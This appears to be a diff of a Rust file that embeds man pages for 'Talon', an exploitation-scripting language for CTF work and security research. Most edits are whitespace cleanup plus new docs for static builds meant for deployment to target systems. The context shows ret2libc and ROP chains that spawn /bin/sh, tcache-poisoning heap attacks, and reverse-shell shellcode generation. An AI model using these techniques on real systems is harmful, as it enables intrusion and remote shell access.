@@ -4,26 +4,25 @@ impl ManPages {
     pub fn generate_all() -> Result<(), String> {
         std::fs::create_dir_all("man/man1")
             .map_err(|e| format!("Failed to create man directory: {}", e))?;
-        
+
         Self::write_page("man/man1/talon.1", TALON_MAN)?;
         Self::write_page("man/man1/talon-rop.1", TALON_ROP_MAN)?;
         Self::write_page("man/man1/talon-shellcode.1", TALON_SHELLCODE_MAN)?;
         Self::write_page("man/man1/talon-exploit.1", TALON_EXPLOIT_MAN)?;
         Self::write_page("man/man1/talon-new.1", TALON_NEW_MAN)?;
         Self::write_page("man/man1/talon-db.1", TALON_DB_MAN)?;
-        
+
         println!("Generated man pages in man/man1/");
         println!("Install with: sudo cp man/man1/* /usr/share/man/man1/");
         println!("View with: man talon");
-        
+
         Ok(())
     }
-    
+
     fn write_page(path: &str, content: &str) -> Result<(), String> {
-        std::fs::write(path, content)
-            .map_err(|e| format!("Failed to write {}: {}", path, e))
+        std::fs::write(path, content).map_err(|e| format!("Failed to write {}: {}", path, e))
     }
-    
+
     pub fn display_page(topic: &str) {
         let content = match topic {
             "talon" => TALON_MAN,
@@ -56,7 +55,7 @@ impl ManPages {
             "talon-fractal" | "fractal" => TALON_FRACTAL_MAN,
             _ => return println!("No manual entry for {}", topic),
         };
-        
+
         println!("{}", content);
     }
 }
@@ -71,9 +70,9 @@ talon \- Domain-Specific Language for Binary Exploitation and Security Research
 
 .SH DESCRIPTION
 .B Talon
-is a domain-specific scripting language for binary exploitation, CTF competitions, and security research. 
-It provides structured syntax for common exploitation primitives including ROP chain building, shellcode 
-generation, heap exploitation, and memory manipulation. Built on Rust for reliability, featuring integrated 
+is a domain-specific scripting language for binary exploitation, CTF competitions, and security research.
+It provides structured syntax for common exploitation primitives including ROP chain building, shellcode
+generation, heap exploitation, and memory manipulation. Built on Rust for reliability, featuring integrated
 binary analysis (Capstone, goblin), constraint solving (Z3), and process memory access tools.
 
 .SH OPTIONS
@@ -95,6 +94,15 @@ Disable colored output
 .TP
 .BR \-\-config " " \fIPATH\fR
 Specify alternate configuration file
+.TP
+.BR \-\-static
+Build statically-linked binaries (use with 'build' command)
+.TP
+.BR \-o " " \fIPATH\fR
+Specify output path for compiled binary (use with 'build' command)
+.TP
+.BR \-\-run
+Automatically execute binary after successful build
 
 .SH COMMANDS
 .TP
@@ -107,8 +115,9 @@ Start an interactive REPL (Read-Eval-Print Loop)
 .B new \fITYPE\fR \fINAME\fR
 Generate a new exploit template (buffer-overflow, rop, heap, etc.)
 .TP
-.B build \fIFILE\fR
-Compile Talon script to native binary
+.B build \fIFILE\fR [\fIOPTIONS\fR]
+Compile Talon script to native binary. Supports static linking for zero-dependency deployment.
+Options: --static (enable static linking), -o PATH (custom output path)
 .TP
 .B wasm \fIFILE\fR
 Compile Talon script to WebAssembly
@@ -159,7 +168,7 @@ Perform taint analysis to detect information leaks
 Automated ROP chain generation with constraint-based gadget solver
 
 .SH CONFIGURATION
-Talon reads configuration from ~/.config/talon/config.toml (Linux/macOS) or 
+Talon reads configuration from ~/.config/talon/config.toml (Linux/macOS) or
 %APPDATA%\\talon\\config.toml (Windows). Configuration options include:
 
 .TP
@@ -201,8 +210,11 @@ Analyze a binary for vulnerabilities:
 Search for a specific CVE:
 .B talon db search CVE-2021-44228
 .TP
-Compile script to standalone binary:
+Compile script to standalone static binary:
 .B talon build exploit.tal --static
+.TP
+Compile with custom output path:
+.B talon build exploit.tal --static -o my_exploit
 
 .SH LANGUAGE FEATURES
 .TP
@@ -313,9 +325,12 @@ Edit exploit.tal with your favorite editor. Talon provides syntax highlighting f
 Test exploit in controlled environment with detailed logging.
 .TP
 .B 5. Deployment
-.B talon build exploit.tal --static
+.B talon build exploit.tal --static -o exploit_final
 .br
-Compile to standalone binary for deployment.
+Compile to standalone static binary for deployment. The resulting binary has zero external dependencies
+and can be deployed to target systems without requiring runtime libraries. On Linux, uses musl libc for
+maximum portability. On Windows, uses MSVC static runtime. Binary size is optimized through LTO and
+stripping.
 
 .SH SECURITY FEATURES
 .TP
@@ -391,8 +406,8 @@ talon-rop \- Return-Oriented Programming utilities in Talon
 .I BINARY
 
 .SH DESCRIPTION
-Talon provides comprehensive ROP (Return-Oriented Programming) gadget searching and 
-chain construction capabilities. It can automatically find useful gadgets, score them 
+Talon provides comprehensive ROP (Return-Oriented Programming) gadget searching and
+chain construction capabilities. It can automatically find useful gadgets, score them
 by quality, and construct complete ROP chains for various objectives.
 
 .SH FUNCTIONS
@@ -520,7 +535,7 @@ talon-shellcode \- Shellcode generation and encoding in Talon
 .B generate_shellcode(\fITYPE\fR, \fIOPTIONS\fR...)
 
 .SH DESCRIPTION
-Talon provides built-in shellcode generation for various payloads, automatic encoding 
+Talon provides built-in shellcode generation for various payloads, automatic encoding
 to bypass filters, and cross-architecture shellcode translation.
 
 .SH SHELLCODE TYPES
@@ -568,8 +583,8 @@ Encode to printable ASCII only
 .TP
 Generate reverse shell:
 .nf
-let sc = generate_shellcode(reverse_shell, 
-                           lhost="10.0.0.1", 
+let sc = generate_shellcode(reverse_shell,
+                           lhost="10.0.0.1",
                            lport=4444)
 .fi
 
@@ -631,7 +646,7 @@ const TALON_EXPLOIT_MAN: &str = r#".TH TALON-EXPLOIT 1 "2026-01-07" "Talon 0.1.0
 talon-exploit \- Exploit development patterns and techniques
 
 .SH DESCRIPTION
-Comprehensive guide to exploit development in Talon, covering common vulnerability 
+Comprehensive guide to exploit development in Talon, covering common vulnerability
 classes and exploitation techniques.
 
 .SH BUFFER OVERFLOW
@@ -652,9 +667,9 @@ payload = payload + shellcode
 .B Leak libc base and return to system()
 .nf
 // Stage 1: Leak
-send cyclic(offset) + p64(pop_rdi) + p64(puts_got) + 
+send cyclic(offset) + p64(pop_rdi) + p64(puts_got) +
      p64(puts_plt) + p64(main)
-     
+
 let leak = u64(recv(8))
 let libc_base = leak - libc_puts_offset
 
@@ -662,7 +677,7 @@ let libc_base = leak - libc_puts_offset
 let system = libc_base + libc_system_offset
 let binsh = libc_base + libc_binsh_offset
 
-send cyclic(offset) + p64(pop_rdi) + p64(binsh) + 
+send cyclic(offset) + p64(pop_rdi) + p64(binsh) +
      p64(system)
 .fi
 
@@ -906,14 +921,14 @@ and libc base addresses.
 .nf
 taint_analysis "./binary_path"
     source: stdin
-    
+
     track_to:
         - stdout
         - stderr
         - socket:<address>
         - file_write:<path>
     end
-    
+
     alert_on:
         - stack_address_leak
         - heap_address_leak
@@ -1057,16 +1072,16 @@ working payloads with exploitability scoring.
 .nf
 auto_rop "./binary"
     goal: system("/bin/sh")
-    
+
     libc: "/path/to/libc.so.6"
     libc_base: 0x7ffff7a00000
-    
+
     constraints:
         - no_nulls
         - max_length:200
         - preserve_rbp
     end
-    
+
     prefer:
         - one_gadget
         - ret2libc
@@ -1169,15 +1184,15 @@ end
 .nf
 auto_rop "./vuln"
     goal: system("/bin/sh")
-    
+
     libc: "/lib/x86_64-linux-gnu/libc.so.6"
     libc_base: 0x7ffff7a00000
-    
+
     constraints:
         - no_nulls
         - max_length:200
     end
-    
+
     prefer:
         - one_gadget
         - ret2libc
@@ -1252,13 +1267,13 @@ House of IO, House of Apple, and largebin attacks.
 .nf
 heap_exploit "./binary"
     glibc_version: "2.35"
-    
+
     technique: tcache_poisoning
     bypass: safe_linking
-    
+
     target: __free_hook
     overwrite_with: system
-    
+
     heap_base: 0x0000555555554000
     libc_base: 0x00007ffff7a00000
 end
@@ -3832,5 +3847,3 @@ send(session, chain.payload)
 .BR talon-goal-planner (1),
 .BR talon-strategy (1)
 "#;
-
- 
